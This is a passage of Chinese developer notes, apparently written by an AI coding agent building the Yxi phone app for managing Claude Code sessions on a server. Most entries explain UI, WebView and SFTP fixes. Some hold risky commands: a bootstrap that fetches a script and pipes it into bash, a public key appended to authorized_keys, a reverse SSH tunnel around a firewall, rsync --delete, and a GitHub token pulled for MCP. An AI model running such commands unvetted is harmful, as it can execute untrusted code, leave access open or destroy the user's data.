（Linux 上有测试盯着它必须先走 `cloud-forget`），`HostLink.kill` 只负责 exec。

**验证**：对 `cc-ctest` 发 App 那条命令，等 40 秒（两个 watchdog 周期）——
没复活，`~/.cloud-sessions/cc-ctest.json` 已移出。转录文件不动（弹窗承诺的「转录留着」仍然成立）。

⚠️ **怎么避开**：「杀会话」这个动作在代码里出现在**两处**（看板终止 / 体检收拾），
修一处忘另一处就是这次。以后再有第三处，先 grep `kill-session`。

⚠️ 顺手修：确认弹窗里那句「它**正在等你回答**」是 `Text()` 画的，不渲染 markdown，
两对星号原样显示在用户面前。


## #189 换了 logo 之后通知栏还是旧图标；官网也没跟

**症状**（用户截图）：通知里的方块大图标还是旧的橙色箭头，状态栏小图标也是；官网 nav 还是旧标。

**三块各有各的原因**：
- **通知大图标**：代码里没 `setLargeIcon`，ROM 拿**启动器图标的缓存**顶上 —— 换了 logo 它还是旧的。
  显式给一张（`ic_notif_large.png`，整个字样在浅灰底上），就不看 ROM 脸色。
- **状态栏小图标**：24dp 白色剪影，「Yunxi」四个连笔字在那个尺寸上是一团糊，
  所以拿 logo 里的**毛笔 Y** 单独做剪影。⚠️ 毛笔字母是连着的，按列找空隙裁不出 Y
  （第一版裁到「Yunx」），要用**连通域**把 Y 那一笔单独抠出来（8 邻域 BFS，不依赖 scipy）。
- **官网**：两处 `.brand` 里的 SVG 换成字样 `<img>`；顺手补了原来就没有的 favicon 和 og:image。
  素材放 `/shots/` —— 那个 location 已经放行了，不再去碰 nginx 白名单（#162）。

⚠️ 顺手：通知正文里 `**0.9.60 已发布**`、`## 三条线`、`|---|---|` 原样显示 ——
`yxi-hook` 的 `last_assistant` 直接把 markdown 塞进通知。加了 `plain()` 剥记号。

## #190 发附件先显示路径、过会儿才变成图 —— 「排队中」气泡漏了

**症状**：用户原话「上传了附件还是会显示路径，后面才会被渲染成可以点击的样子，有点割裂」。

**根因**：#179 只改了 `UserBubble`（入了转录的消息），**`QueuedBubble`（排队中）画的还是原文**。
发出去先是排队态 → 一条路径；入了转录才走缩略图那条路 → 变成图。

**修法**（两处）：
- `QueuedBubble` 同样 `parseRefs` + `AttachThumb`。
- **发送那一刻把本地那份种进缩略图缓存**（`Thumbs.seed`）：图刚从这台手机传上去，
  没理由再从服务器拉一遍。种完再清 `staged`。之后不管排队态还是入转录，**第一帧就是图**。

## #191 照着用户录的 参考款 视频逐帧抄动效 —— 视频要拆成帧表才看得了

用户：「你的 ux 动效还是做的不行……我直接录制了一个 参考款 的进入和提问的全流程你直接学习」。
mp4 没法直接看：`ffmpeg -vf fps=5,scale=270:-1` 抽 120 帧，拼成 5 张 contact sheet（每张 24 帧 = 4.8 秒，
帧上标时间），再逐张看。**看 5 张表比看 120 张图快得多，而且时间关系一目了然。**

**从帧表里读出来的（时间以录像为准）**：
| 时间 | 动作 |
|---|---|
| 0→14s 打字 | 蓝色聚光在**输入框上方**（底部），跟键盘一起走；开始打字那刻问候语淡出 |
| 14.4→15.0s 发送 | 输入框里的字**飞上去**变成气泡（半路还没套气泡壳）；键盘同时收 |
| 15.0→15.4s | 底部那团光**脱离输入框往上迁**，铺满顶部 40% |
| 15.6→19.0s 思考 | 色相**递减**循环：蓝→青→绿→黄→橙→粉，约 4 秒一轮；左侧「···」，后变「··· 正在搜索网络」 |
| 18.4→18.8s | 回答第一段**先灰后实**淡入（不是打字机） |
| 19.8→20.2s | 回答铺开的同时光晕**退掉**；之后每块逐个淡入 |

**落到 Yxi**（`ThinkingGlow` 三态 + `EnterUp`）：待机底部聚光 → 忙了 650ms 迁到顶部 →
干活中色相循环 6 秒一圈 → 回答到达退到 35%；新气泡 / 新回答块从下滑入淡入 380ms。
⚠️ **等你拍板那档不循环、定在琥珀** —— 参考款没有这个状态，我们有，而且它是最要紧的信号。
⚠️ 色相**方向**自己渲染核对过：`+300°` 是蓝→紫→粉，跟录像反着；要 `−300°`。
⚠️ 进入动画只给「加载完之后才出现」的条目（`seenKeys`），初始几百条一起滑入是灾难。


## #192 输入框上方一条横向色差 —— 光晕只画在列表那个 Box 里

**症状**（用户在截图上划了条红线）：快捷语那一行的上沿有一道明显的明暗边界，上面偏蓝、下面纯平。

**根因**：`ThinkingGlow` 放在 `Box(Modifier.weight(1f))`（列表区）里，画布到列表底边为止；
快捷语和输入框在它外面，是主题的平底。而**待机态的聚光锚在列表区的底边**（y≈1.0），
最亮的那一圈正好压在那条边上 —— 上面有光、下面没有，就是一条线。

**修法**：把光晕挪到对话页最外层，包一个 `Box` 让它铺**整页**（含快捷语和输入框背后），
`Column` 只管布局。参考款的聚光本来就在输入框**背后**。
⚠️ 输入框和快捷语都是药丸形 `Surface`，没有整宽的不透明底，所以铺到底不会被挡。
⚠️ 改这个的时候我第一次用了 8 空格缩进去匹配一个 4 空格缩进的行，断言失败、文件没动，
却照样起了编译 —— **改完先 grep 确认真的改了，再编译。**

## #193 「把仓库里某个产品名全删掉」—— 哪些不能碰

用户：「git 里面 gemini 相关的字全部删了，就是只删除名字其他什么都不变」。56 处、16 个文件。
全局替换成中性词「参考款」之前，先分出**三类不能碰的**：
- **存进用户手机的 key**（`Skin.Style.Light("gemini", …)`）：那是数据不是名字，改了等于把所有选过浅色的人重置。
  保留 key，注释改成不点名的说法。
- **测试夹具**（iOS `"by":"Gemini"` + 断言）：夹具和断言一起换，测试照样过；只换一边就红。
- **文档里的示例字符串**（`如 "Gemini (nanobanana)"`）：换成别的例子，语义不变。
其余全是注释和文档里的名字。做完 `grep -rni` 确认只剩那个 key，再编译 + 跑测试 + i18n 检查。

## #194 状态栏 / 锁屏的通知小图标还是旧的 —— 包里早换了，是 ROM 缓存

**症状**：0.9.62 已把 `ic_stat_yxi` 换成新 logo 的笔刷 Y（#189），用户锁屏上的通知却还是老的箭头。

**排查**：别猜，拆包看。`unzip -o Yxi-107.apk 'res/drawable-*/ic_stat_yxi.png'` 三个尺寸渲染出来
全是新的 Y，包里**没有**旧箭头。所以不是资源没换，是**手机端缓存**：MagicOS（荣耀）会按包名缓存
通知小图标的位图，覆盖安装不刷新。

**修法 / 怎么避开**：
- 用户侧：重启一次，或 设置→应用→Yxi→**强行停止**，再来一条通知就是新的。
- 我们侧：顺手把通知的着色从老铜色 `#E08B57` 改成品牌蓝 `#0B57D0`（`EventService` 的汇总通知），
  跟 App 图标的调子一致。⚠️ 大图标（`setLargeIcon`）本来就在，ROM 不给大图标就退回启动图标那事儿见 #189。
- 以后换通知图标，**先拆包核实资源，再下结论**，别对着截图来回改代码。

## #195 官网首屏也要那道流动光 —— canvas 抄 `ThinkingGlow`，底边用 mask 淡出

用户：「ux 的动效色差也可以放到我们的官网上」。

**做法**：首屏放一个 `<canvas class="hero-glow">`，JS 照 `ThinkingGlow` 的规矩画：
四团径向渐变各自独立相位（周期 7.3/9.1/11.7/13.9 秒互不成整数倍，#186），
色相 6 秒一圈**递减**着走（蓝→青→绿→黄→橙→粉，方向别反，#191），亮度浅色 ×0.8、深色 ×0.45。
`prefers-reduced-motion` 就画一帧静的，不循环。

**踩的坑**：第一版光晕到首屏底边**硬切一道**（跟 App 里 #192 一模一样的病）——
画布在首屏 section 里，section 之下是白底。修法是给画布 `mask-image: linear-gradient(to bottom, #000 50%, transparent)`，
光在到底之前就淡没了。截图核对过（`site-glow2.png`）：没线了。
⚠️ 官网跟 App 是**同一套参数**，改动效的时候两边一起改，别让它们各走各的。

## #196 Linux 上的 xcodegen 突然段错误（`_CFIsSwift` 崩）—— 工程改到 Mac 上生成

**症状**：`xcodegen generate` 走到「Generating project...」就 `Signal 11`，改动前的干净工程也一样崩，
`LD_LIBRARY_PATH` 指到 `/opt/swift` 也没用。8/31 还能用，9/2 就不行了（本机 swift 运行库变过）。
更糟的是我的流程里 `rsync --delete` 在它崩了之后照跑，**把 Mac 上原来那份 `Yxi.xcodeproj` 也删了**，
接着 `xcodebuild` 报 `'Yxi.xcodeproj' does not exist`。

**修法**：不在 Linux 上生成了。xcodegen 的 macOS 发行包（GitHub release 的 `xcodegen.zip`，4MB）
放在 Mac 的 `~/yxi-build/tools/xcodegen/bin/xcodegen`（用户 Mac 没有 brew）。流程变成：
```bash
rsync -az --delete --exclude build --exclude .build --exclude '*.xcodeproj' ios/ mac:~/yxi-build/
ssh mac 'cd ~/yxi-build && ./tools/xcodegen/bin/xcodegen generate && xcodebuild build -project Yxi.xcodeproj \
  -scheme YxiApp -configuration Debug -destination "generic/platform=iOS Simulator" -derivedDataPath build \
  -skipPackagePluginValidation -skipMacroValidation CODE_SIGNING_ALLOWED=NO 2>&1 | grep -E "error:|BUILD"'
```
⚠️ scheme 叫 **`YxiApp`**（#160 里写的 `-scheme Yxi` 是旧的）。
⚠️ 任何「生成 → 同步」的链条，**生成失败就要停**，别让后面的 `--delete` 把对面能用的东西冲掉。

## #197 `dev/precheck.sh` 误报「花括号差 2」—— raw string 规则被注释和 `"#"` 骗了

**症状**：`Transcript.swift` 明明能编（Linux 上 `swift build` 过），precheck 却报花括号不平。

**根因**：它先剥字符串再剥注释。`#"…"#` 那条正则从任何 `#"` 开始一路吞到下一个 `"#`——
① 普通字符串 `"#"` 里也有 `#"`；② 注释里举例写的 `` `#"\u{1B}…"#` `` 也是。
两处都从那儿吞掉几十上百行**真代码**，花括号自然不平。

**修法**（`dev/precheck.py`）：整行注释先剥；raw string 的开头要求前面不是引号（`(?<!")#"`）。
⚠️ 通则：文本级检查报错先怀疑检查器 —— 拿 `strip()` 的输出按声明行核对花括号计数，一分钟定位。

## #198 「连接」：在手机上把 GitHub / Notion 这类服务认证给服务器上的 agent —— 三个关键事实

用户要的：配置页里点一下、手机上弹认证界面、认证完 Claude Code / Codex 就能用那个服务。
调研（2026-09-02，官方文档 + 服务器实测）得出三件事，决定了怎么做：

1. **claude.ai 连接器（Gmail / 日历 / Slack …）用 API key 的 Claude Code 一律不加载**——文档写死的：
   只有 claude.ai 订阅登录才拉取。「Claude in Chrome」也只配同一台电脑上的 Claude Code。
   所以这两类在面板里**只解释、不假装能连**。
2. **GitHub 走 `gh auth login -h github.com -p https -w` 的设备码**。在 tmux 里跑，屏幕上会先问
   `Authenticate Git with your GitHub credentials? (Y/n)`（回 Enter = 顺手把 gh 配成 git 的凭据助手，
   Codex 也就能 push 了），再打印 `one-time code: XXXX-XXXX` 和 `Press Enter to open …`（服务器没浏览器，
   回个 Enter 让它继续等）。手机把码复制进剪贴板、开 github.com/login/device，用户粘一下就完。
   登录后 `gh auth token` 拿 token 给 GitHub 官方远程 MCP（`api.githubcopilot.com/mcp/`，Bearer 头）——
   一次登录，git 和 MCP 都有。
3. **远程 MCP 走 `claude mcp login <名> --no-browser`**：它把授权 URL 打在屏幕上，还接受
   `Or paste the redirect URL here:`。授权完服务商把浏览器重定向到 `http://localhost:64202/callback`
   （Claude Code 临时起的回调口。⚠️ **端口是随机的**：三次实测 64202、64202、60018，所以必须每次从 URL 里解出来，不能写死）。手机上用 **jsch 本地端口转发**
   （`setPortForwardingL("127.0.0.1", port, "127.0.0.1", port)`）把手机的 localhost:port 接到服务器 ——
   手机浏览器打 localhost 就直接到了 Claude Code，页面显示它自己的「成功」页。转发不成就退回粘地址。
   ⚠️ `capture-pane` 必须带 `-J`：授权 URL 三百多字符必然折行，不接回去正则抓不到整条。
   ⚠️ 用错的 code 打回调，屏幕上是 `Couldn't complete authentication for "notion": …` + 非零退出 ——
   把 `echo __DONE__$?` 接在命令后面，手机只认这个标记，不猜屏幕文案。

所有地址都在服务器上用 MCP `initialize` 探过：401 = 在线要认证，200 = 免认证（Hugging Face / Context7 / DeepWiki）。

## #199 `gh auth login -w` 在服务器上真的会开浏览器 —— 设 `BROWSER=true`

**症状**：测 GitHub 设备码流程时，对「Press Enter to open … in your browser」回了个 Enter，
服务器上 VNC 桌面（`cloud-vnc.service`，DISPLAY=:1）里**真弹出一个 Chrome**，吃掉半个核。

**根因**：`gh` 用 `$BROWSER`（没有就 xdg-open）开 URL，这台机器有 X 桌面，就开成功了。
`claude mcp login` 有 `--no-browser`，`gh` 没有对应开关。

**修法**：`BROWSER=true gh auth login …`（`true` 是那个什么都不做的命令）。gh「打开」成功后照常轮询。
手机端 `Connect.ghLoginStart()` 已带上。⚠️ 凡是在服务器上代用户跑「会开浏览器」的 CLI，都先想这一条。

## #200 我把用户的服务器搞卡了 —— 模拟器 + gradle 在用户干活的时候一起跑

**症状**（用户：「你先看看现在服务器的状态为什么那么卡」）：load 24，CPU steal 35%，
手机 App 上一串 `Read timed out` / 「连接断了，正在重连」。

**根因**：我为了做冒烟测试起了 Android 模拟器（qemu 占 2 个多核 + 4GB），同时还跑了两轮 gradle；
这台机器本来就有三四成的 steal（宿主超卖），一点余量都没有。**用户在这台机器上实时干活。**

**修法 / 规矩**：
- 模拟器**只在用户明确不在用的时候**起，用完立刻 `adb emu kill`；日常验证靠编译 + 真机。
- 起任何重活之前先看一眼：`uptime` + `top -bn1 | grep %Cpu`（看 `st`）；steal 已经 > 25% 就别加码。
- 杀自己的进程别用 `pkill -f`（会匹配到自己的 shell，退出码 144，#见上文）：
  `ps -eo pid,args | awk '/qemu-system-x86_64-headless/ && !/awk/ {print $1}' | xargs -r kill`。
- VNC 桌面里那个 Chrome 是 `cloud-vnc.service` 的（给客户做网页登录用的），**不是我们的，别碰**。

## #201 两条排队的提示词被 Claude Code 合成一条，附件头落在中间 —— 缩略图不出来

**症状**（用户截图）：气泡里是「第一段话[图片1] /root/src/tmp/…jpg\n第二段话」，图没渲染、路径原样躺着。

**根因**：用户趁 Claude 忙的时候连发两条，第二条带图。Claude Code 把队列里的几条**合成一条**用户消息
送进去（转录里就是一条），我们贴在第二条最前面的附件头就落到了正文中间。
`Attachments.parseRefs` 原来只认**开头连续**的几行（怕吃掉正文里长得像的句子），于是一条都没认出来。

**修法**：整段里任何一行匹配 `^[标签] /绝对路径$` 都摘出来当附件；正则本身够严，正文撞上的概率可以忽略。
「两条被合成一条」是 Claude Code 的行为，改不了，也没必要改。

## #202 断线重连时看板把收藏全标成「未启用」—— 半截输出被当成「零个会话」

**症状**（老问题，用户又截到）：横幅「连接断了，正在重连…」，看板上只剩「未启用 5」，跑着的会话一个不见。

**根因**：连接半断时 `exec` 带着半截（或空的）输出回来，`SessionProbe.extract` 找不到标记就**安静地返回空串**，
解析成零个会话、还标成 fresh —— 于是所有收藏都「不在运行列表里」= 未启用。#183 只挡住了「还没同步到」，
没挡住「同步到了一份坏的」。

**修法**：`snapshotFull` 先核对 `tmux_begin/tmux_end` 两个标记都在，缺一个就抛错 —— 走失败那条路：
上一份继续摆着、横幅照常显示、`fresh` 不动。
⚠️ 通则：**凡是「解析不到就返回空」的地方，都要问一句「空」和「坏」怎么区分。** 分不开就报错。

## #203 「像微信那样弹窗」到底有没有 —— 设置里直接给一条试的

用户问「做完是不是就会像微信那种弹窗，还是现在就有」。其实一直有：`yxi.needs` 频道是 IMPORTANCE_HIGH，
带震动、锁屏可见、能点亮屏幕。但用户看不到证据，而且两处会静默失效：
① 系统里把 App 的通知整个关掉时，`POST_NOTIFICATIONS` 权限仍是「已授予」—— 要查 `areNotificationsEnabled()`；
② 用户（或荣耀的「智能通知」）把那条频道降级成「低」，通知只进列表不弹。
所以设置页「手机主动响」里加了两行：「弹窗提醒（横幅）」看频道重要级、点了跳那条频道的系统页；
「发一条试试」走正式频道发一条真的，当场看它弹不弹。

## #204 给用户审的东西写死进了 App —— 实验室的规矩是「从服务器推」

**症状**：开屏动效五个方案，我在实验室页面里塞了一张 App 内置的卡（`SplashLabCard`），能播能选。
用户一句话打回：「我们之前不是强调说过实验室留给我审核的应该是网络传输的而不是写在 App 里面的」。

**为什么这条规矩重要**：实验室的定位是 **agent 产出 → `yxi-lab add` → 手机上审**，审的东西不用发版、
不用等编译，agent 随时能推、随时能撤；写进 App 就变成「每审一次发一版」，而且审的和最终上的还是两套东西。

**修法**：App 里那张卡和选择器删掉（原生实现留着，`Splash.DEFAULT_KEY` 定谁上）；五个方案各做一个
单文件 HTML（logo 用 data URI 内联，WebView 预览区约 330×340，循环播），`yxi-lab add` 推上去；
用户在实验室勾「采纳」，`yxi-lab approved` 看到是哪个，再把 `DEFAULT_KEY` 改成它发版。
⚠️ 以后凡是「给用户挑 / 给用户看效果」的东西，先问一句：能不能做成一个文件推到实验室？能就别碰 App。

## #205 实验室里网页预览一片空白 / 动画停在第一帧 —— `AndroidView.update` 每次重组都在重载页面

**症状**（用户截图）：「粒子 B · 点阵波场」卡片里只有底部一行「点一下重播」，画布全白；有的动画一直停在第一帧。

**根因**：WebView 的 `loadDataWithBaseURL` 写在 `AndroidView(update = { … })` 里。`update` 是**每次重组都跑**的
（滚一下列表、勾一下采纳、任何状态变一下），页面就被反复重载。等图 onload 才开始画的页面永远等不到那一刻。
另一个次要原因：预览框用 `heightIn(max)`，WebView 首帧尺寸不定，`innerHeight` 可能是 0，画布 0×0。

**修法**：加载放进 `factory`（只跑一次），`update` 留空；预览框按 manifest 里的 `aspect` **定死高度**
（网页默认 1:1、视频 16:9）；网页契约里要求监听 `resize`（`yxi-lab check` 会提醒）。
顺手：图片改 `ContentScale.Fit`（原来 FillWidth 把竖图裁掉一截，就是「展示不全」）；加了全屏。
⚠️ 通则：`AndroidView.update` 里只放「把状态同步给 View」的幂等操作，**任何有副作用的（加载、播放、重置）都不许放**。

## #206 这台机器上模拟器已经不可用了 —— 哪怕 `-cores 2`，一开就 load 20+

**症状**：为了看实验室 WebView 到底怎么了，起模拟器（`-cores 2 -memory 2048`）。60 秒开机没问题，
但 App 一跑（粒子开屏 + 软件渲染 swiftshader）load 从 1 飙到 23，adb 直接 `error: closed`，一张截图都没拿到。
用户之前刚为这个骂过（#200）。

**结论**：**本机不再用模拟器验证界面**。宿主 steal 三四成 + 纯软件 GPU，模拟器跑个动画就把机器拖死。
**替代（已建好，2026-09-02）**：**用户的 Mac 上有一套完整的 Android 模拟器环境**（Apple 芯片硬件加速，30 秒开机，
不吃这台服务器）：`~/yxi-build/android-sdk`（JDK 17 在 `~/yxi-build/tools/jdk`，arm64 系统镜像，AVD 叫 `yxi`），
驾驶脚本 `~/yxi-build/mac-emu.sh`：`start | seed | restart | shot <png> | tap x y | swipe … | log | stop`。
流程：`scp` debug 包到 `~/yxi-build/Yxi-debug.apk` → `mac-emu.sh start` → `seed`（装包、写 hosts.json 指向
216.36.108.147、从 logcat 取公钥）→ 把公钥以 `yxi@emulator` 追加进本机 authorized_keys → `restart` → `tap/shot`。
用完 `stop` + 把那行公钥删掉。整套约 5.6GB，都在用户 Mac 的 `~/yxi-build` 里。
替代路线：① 把诊断做进 App —— WebView 的 `onConsoleMessage` 把 JS 报错直接显示在卡片上，
读不到内容也说出来，用户截图就是 DevTools；② 网页本身在服务器的 VNC 桌面 Chrome 里用 `data:text/html;base64`
（源是 null，跟 WebView 一样）真时间跑一遍再截图（`import -window root`）。
⚠️ 用完记得把 `yxi@emulator` 那行从 `~/.ssh/authorized_keys` 里删掉。

## #207 实验室网页预览白板的另外两条根因（0.9.72 一起修）

在 #205（update 反复重载）之外还有两条，都是「看着像页面坏了，其实是 App 没把内容送对」：
1. **`produceState` 只键 `item.id`**：手机上重连是常态，连接换过一条之后老的 state 还抱着死连接返回的空串，
   `loadDataWithBaseURL` 灌进去一个空页面 —— 白的，什么提示都没有。现在键上 `ssh`，空串当失败说出来。
2. **WebView 刚建出来是 0×0 就 load**：页面首帧读到的 `innerWidth/innerHeight` 是 0，画布 0×0；
   页面若只在启动时读一次尺寸、不监听 resize，就永远空着。现在 `post {}` 到布局定了再 load，
   契约里也要求页面监听 resize（`yxi-lab check` 会提醒）。

## #208 文件预览里 Markdown 的图全没了 —— 文档用的是 HTML `<img>`，渲染器只认 `![]()`

**症状**（用户：unitree_rl_mjlab 里的 md「为什么没渲染出图片」）：thesis.md / README_zh.md 一张图都不显示，文字正常。

**根因**：这些文档为了控制宽度和居中，图写成 `<img src="figs/x.png" width="900" />`，外面常再套
`<p align="center">` / `<div>`。我们用的 Markdown 渲染器只认 `![alt](src)`；整行 `<img …>` 按 CommonMark
是 HTML 块，被原样吞掉，`SftpImages`（按 SFTP 取相对路径的图）根本没机会被调用。

**修法**：渲染前过一遍 `MarkdownFix.apply()`：`<img>` → `![alt](src)`；剥掉 `<p>/<div>/<center>` 这类壳
（不剥的话整段还是 HTML 块）；`<b>` → `**`，`<br>` → 换行。别的 HTML 不碰。
⚠️ GIF 走 `BitmapFactory` 只显示第一帧 —— 文档里的演示 GIF 是静态的，够看，不为它引库。

## #209 实验室网页预览白板的**真正根因**：Compose 给 WebView 的 layoutParams 是 wrap_content → 100vh = 0

**症状**：所有动画网页在实验室卡片里只剩底下那行「点一下重播」，画布一片白；手机和 Mac 模拟器上一样；
页面没有任何 JS 报错；同一页面在桌面 Chrome（用 `data:text/html` 模拟 null 源）正常。

**怎么定位的**（#205 #207 那几条都是真问题但都不是它）：往实验室推了两个诊断页 —— 一个把
`innerWidth/innerHeight/dpr/visualViewport/100vh/100%/svh/dvh` 打在页面上，一个把点阵波场原页加一层叠层
（视口、画布后备尺寸、CSS 尺寸、图片加载状态、`window.onerror`）。叠层给出铁证：
`innerHeight=356`、画布后备 935×935、图片已加载、JS 在跑，**但 canvas 的 CSS 高度 = 0**；
诊断页进一步确认 `100vh = 100% = 100svh = 100dvh = 0`，而 `html.clientHeight = 356`。

**根因**：`AndroidView` 建出来的 View 默认 `layoutParams` 是 `WRAP_CONTENT`。Android WebView 一看自己的
高度是 wrap_content，就告诉 Chromium「视口高度不限」（它要靠内容算自己多高），于是页面里所有按视口高度算的
CSS 单位全部是 0。`innerHeight` 照样报 View 的高度，所以只看 JS 数字完全发现不了。

**修法**：factory 里 `layoutParams = ViewGroup.LayoutParams(MATCH_PARENT, MATCH_PARENT)`。一行。
同时保留 #207 的「等布局定了再 load」和 `useWideViewPort=true`（false 时布局视口也没高度）。
⚠️ 通则：**Compose 里放 WebView，第一件事就是把 layoutParams 设成 match_parent**。
⚠️ 排查网页在 WebView 里的问题，最快的路是**把诊断信息打在页面上**（叠层 / onerror）再截图，
而不是猜 WebView 的设置 —— 这次光猜设置就发了三版（0.9.71～0.9.73）没打中。

## #210 同一个包里两个文件各自 `private class Field` —— Kotlin 报 Redeclaration

**症状**：三个子代理照着 `SplashParticles.kt` 的骨架各写一个开屏方案，都顺手抄了 `private class Field(...)`。
编译报 `SplashParticles.kt:118 Redeclaration`，另一个文件里 `field.bw` / `field.t0` 全部 Unresolved（它解析到了别人的 Field）。

**根因**：顶层 `private` 类只是「文件内可见」，但**它编译出来的 JVM 类名是全包名**（`app.yxi.ui.splash.Field`），
两个文件撞名就是重声明。顶层 private **函数 / 常量**不会撞（各自进 `XxxKt` 类），类会。

**修法**：按文件加前缀（`VortexField` / `StardustDust` / `SparkleSparks`）。
⚠️ 让多个 agent 照一份骨架写同类文件时，规格里写明「顶层 class 名带方案前缀」。

## #211 一个会话在两个组里：它知道自己在两个组，但分不清谁是哪个组的、消息也不带组名

**用户问**：cc-logto 被编进了 infra 和 omggrow 两个组，它知道吗？协作时分得清是哪个组的 agent 在跟它说话吗？

**原状**（2026-09-02 前）：
- 知道在两个组：SessionStart 的 `yxi-hub context` 说「在「infra、omggrow」组里」，手机编组时每个组也各发一条通知。
- **分不清**：同组名单是两个组**并成一串**列的（cc-boomassets、cc-omggrow_acquire、cc-omggrow_order），没说谁属于哪个组；
  `yxi-hub say` 送过去的消息只有 `[同组 发件人]`，**不带组名**；`yxi-hub all` 会把话**同时发到它所有组**的所有人。
  三处叠起来，多组成员确实会串。

**修法**（`server/yxi-hub`，只改服务器侧，不用发版）：
- `who` / `context` **按组分开列**：「infra」组：cc-boomassets；「omggrow」组：cc-omggrow_acquire、cc-omggrow_order；
  多组成员的 context 里多一句「收到的消息前面是 `[同组 组名 · 谁]`，照着组名区分」。
- `say` 的消息改成 `[同组 <两人共同的组> · 发件人]`（共同在多个组就 `a/b`）。
- `all` 在多个组里时**必须指明组**：`yxi-hub all <组名> "话"`，不指明就拒绝并列出你的组；只在一个组里照旧。
- 测试：`YXI_GROUPS_FILE=<临时表> ` + 一个临时 tmux 会话名，`who / context / all` 三条都跑过。
⚠️ 已在跑的会话要**重开**（或自己跑一次 `yxi-hub who`）才看得到新的 context；hook 只在 SessionStart 注入。

## #212 Markdown 里的图**读回来了却画不出来** —— `ImageTransformer.transform` 里不能 produceState

**症状**（模拟器里用测试文件验证 #208 时发现）：`![](a.png)` 和转过来的 `<img>` 都不显示；加日志后看到
`img a.png -> …/a.png bytes=35965 bmp=600x243` 紧跟一条 `read failed: The coroutine scope left the composition`，
如此反复。也就是说 **#208 那次只修了一半**：转换对了，加载那层从来没成功显示过（老的 `![]()` 也一样坏）。

**根因**：`SftpImages.transform()` 是 `@Composable`，里面用 `produceState` 存加载结果。渲染器（mikepenz markdown）
在组合期间反复重调 transform，每次都是新的组合作用域 —— 上一个的 state 连同它的协程一起被丢掉，
SFTP 读到一半就取消，永远到不了「显示」那一步。**在会被反复重建的组合里放异步状态，等于没放。**

**修法**：缓存放在 `SftpImages` 这个对象上（`mutableStateMapOf` 存成功的 painter，读完触发重组），
加载挂在 FileViewer 那一层的 `rememberCoroutineScope()` 上，`transform` 只查表、不做事。
模拟器里 Markdown / HTML 相对路径 / HTML 绝对路径三种写法都出图了。
⚠️ 排查方法同 #209：**先加日志看数据到底走到了哪一步**，别对着代码猜。

## #213 文件浏览器进大目录卡几分钟、点面包屑「没反应」

**症状**：进 `/tmp`（五千多项）转半天；期间点面包屑，路径变了、列表还是上一个目录的。

**根因**：① `Sftp.list` 对**每个符号链接**都 `stat` 一次解引用（看指不指向目录），一次一个来回，
几百个链接就是几百个来回，而且整个通道被锁住，后面所有操作都排队；② 列表没有「读取中」状态，
旧内容一直挂着等新结果，用户以为没点上。

**修法**：只解引用前 24 个链接，其余标 `isLink`、点开那一刻再问是不是目录；用 jsch 的 `LsEntrySelector` **边收边数、到 3000 项就 BREAK**（不是收全再截，那样来回一个不少）并提示；
换目录立刻清屏 + 「读取中…」，结果只认当前目录（等的时候又点走了就丢掉）。
⚠️ 剩下的慢是 SFTP 本身：五千项要几十个来回，隔着公网十几秒，这是协议的账，不是 bug。

## #214 Markdown 里的大图：先看大小再决定，占位别跳

用户定的规矩：**图太大就不加载，其余的放那慢慢加载。** 做法（`SftpImages`）：
先 `size()`，> 8MB 给一张「图片 N MB，太大没加载」的占位图；≤ 8MB 先给「加载中…」灰底占位、
后台读、按 1600px 降采样解码（4000px 的图原样解码几十 MB，几张就 OOM）、读完原地换掉，版面不跳。
⚠️ 渲染器按「像素 ÷ 密度」定图宽、FillWidth 不放大过原尺寸 —— 占位图要画宽（1800px），否则只有六成宽。
模拟器验证：36KB 立刻出、8MB 三十秒后出、19MB 显示太大没加载。

## #215 一键装机：全新 Ubuntu 镜像里 curl / wget / python3 一个都没有，`curl … | bash` 在最需要它的机器上恰恰跑不了

**症状**：手机上点「一键装机」，10 秒就报「装好了」，什么都没装。日志只有一行 `wget: command not found`。
**根因**：① 手机那条命令是「让服务器自己 curl / wget 脚本再 pipe 进 bash」，而 `ubuntu:24.04` 干净镜像里两个都没有（python3 也没有）；
② `( … | bash )` 的退出码是管道**右边** bash 的 —— 左边命令不存在、右边读到空输入照样退出 0，于是 `__DONE__0`，手机以为成了。
**修法**：手机自己 HTTPS 取脚本（它刚查过更新，有网），heredoc 写到 `~/.yxi/bootstrap.sh` 再 `nohup bash` 跑；
取不到才退回服务器侧 curl / wget，而且那条加 `set -o pipefail`。脚本自己第一步用 apt / dnf / apk 把 curl 装上。
⚠️ 教训：**「服务器上总有 curl」是错的假设**；验收装机脚本要用**干净镜像**（podman `ubuntu:24.04`），在自己机器上跑一遍不算数。

## #216 在本机开容器做「新客户」测试：podman 缺 netavark、端口 2223 撞上反向隧道

**症状**：`podman run -p 2223:22` 报 `netavark: No such file or directory`；换成 host 网络后 `ssh -p 2223 127.0.0.1` 一直 Permission denied。
**根因**：Ubuntu 24.04 的 podman 包不带 netavark（要另装）；而 `127.0.0.1:2223` 本来就有本机 sshd 的反向隧道监听
（remote-dev-station 那套），我 ssh 到的其实是那头的机器。
**修法**：`--network=host` + 容器里 sshd 改 `Port 22022`（先 `ss -ltn` 确认没人用）；模拟器 hosts.json 多一台 `fresh`（同一 IP、22022 口）。
本机没有 docker，`apt install podman` 即可（不起守护进程）。测完 `podman rm -f yxi-fresh yxi-fresh2`。⚠️ 别碰 2222 / 2223 —— 那是隧道。
⚠️ **云厂商防火墙只放 22 / 8443**：容器 sshd 听在 22022 上、本机 `ss` 看得见，Mac 上 `nc` 却是 closed。
绕法不动防火墙：本机 `ssh -f -N -R 22022:127.0.0.1:22022 mac` 反向隧道到 Mac 的回环，模拟器里主机填 **10.0.2.2:22022**
（模拟器的 10.0.2.2 = 宿主机回环）。给模拟器塞 hosts.json 时注意 `json.dumps` 默认带空格，sed 别按无空格的写。

## #217 从手机登录 Claude Code / Codex：两家的无浏览器流程长得不一样

- **Claude Code**（2.1.258）：`claude auth login` 没浏览器时打一条 URL，`redirect_uri` 指向 **platform.claude.com/oauth/code/callback**，
  不是 localhost —— 所以**不能**像 MCP 那样转发端口；用户在页面登录后拿到一串**码**，粘回终端的 `Paste code here if prompted >`。
  域名已从 `claude.ai/oauth/authorize` 换成 `claude.com/cai/oauth/authorize`，正则别写死域名（`https://\S*oauth/authorize\?\S+`）。
  要加 `env -u DISPLAY BROWSER=true`：有 VNC 桌面的机器它会真开一个 Chrome（#199 那一族）。
- **Codex**（0.152）：`codex login --device-auth` → `https://auth.openai.com/codex/device` + 一次性码，**码在下一行、4-5 位**（`QUUK-AW27Q`），
